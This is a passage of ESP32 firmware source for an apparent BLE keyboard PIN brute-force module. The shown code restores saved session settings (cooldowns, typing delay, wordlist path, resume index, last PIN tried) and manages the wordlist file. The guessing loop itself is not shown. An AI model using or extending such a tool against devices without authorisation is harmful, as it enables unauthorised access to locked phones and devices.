    _attemptsBeforeTimeout = prefs.getUShort("att_before", 0);
    _cooldownMs = prefs.getUInt("cooldown", 30000);
    _interAttemptMs = prefs.getUInt("inter", 400);
    _typingDelayMs = prefs.getUShort("typing_delay", 20);
    _startDelayMs = prefs.getUShort("start_delay", 500);
    _maxAttempts = prefs.getUInt("max_attempts", 10000);
    _persistEvery = prefs.getUShort("persist_every", 1);
    _autoResume = prefs.getBool("auto_resume", true);
    _sessionKey = prefs.getString("session_key", "default");
    _wordlistFile = prefs.getString("wordlist_file", BLE_PIN_WORDLIST_PATH);
    _startIndex = prefs.getULong64("start_index", 0);
    _endIndex = prefs.getULong64("end_index", 0);
    _attemptsTotal = prefs.getUInt("attempts_total", 0);
    _attemptsInCycle = prefs.getUInt("attempts_cycle", 0);
    _estimatedTotal = prefs.getULong64("estimated_total", 0);
    _stopReason = prefs.getString("stop_reason", "");
    _lastPin = prefs.getString("last_pin", "");
    _lastError = prefs.getString("last_error", "");
    _cooldownUntilMs = prefs.getUInt("cooldown_until", 0);
    _startedAt = prefs.getUInt("started_at", 0);
    _updatedAt = prefs.getUInt("updated_at", 0);
    prefs.end();
}

void BlePinBruteforce::clearPersistedSession() {
    Preferences prefs;
    if (prefs.begin(NVS_NAMESPACE, false)) {
        prefs.clear();
        prefs.end();
    }
}

bool BlePinBruteforce::readWordlistFile(String& out) {
    if (!blePinFsBegin(false)) return false;
    File file = BLE_PIN_FS_OPEN(_wordlistFile.c_str(), FILE_READ);
    if (!file) {
        blePinFsEnd();
        return false;
    }
    out = "";
    out.reserve(file.size());
    while (file.available()) out += (char)file.read();
    file.close();
    blePinFsEnd();
    return true;
}

bool BlePinBruteforce::wordlistFileExists() {
    if (!blePinFsBegin(false)) return false;
    bool exists = false;
#if defined(CONFIG_IDF_TARGET_ESP32S3)
    exists = FFat.exists(_wordlistFile.c_str());
#else
    exists = SPIFFS.exists(_wordlistFile.c_str());
#endif
    blePinFsEnd();
    return exists;
}

void BlePinBruteforce::removeWordlistFile() {
    if (!blePinFsBegin(false)) return;
#if defined(CONFIG_IDF_TARGET_ESP32S3)
    FFat.remove(_wordlistFile.c_str());
#else
    SPIFFS.remove(_wordlistFile.c_str());
#endif
    blePinFsEnd();
}

#endif // ENABLE_BLE_HID
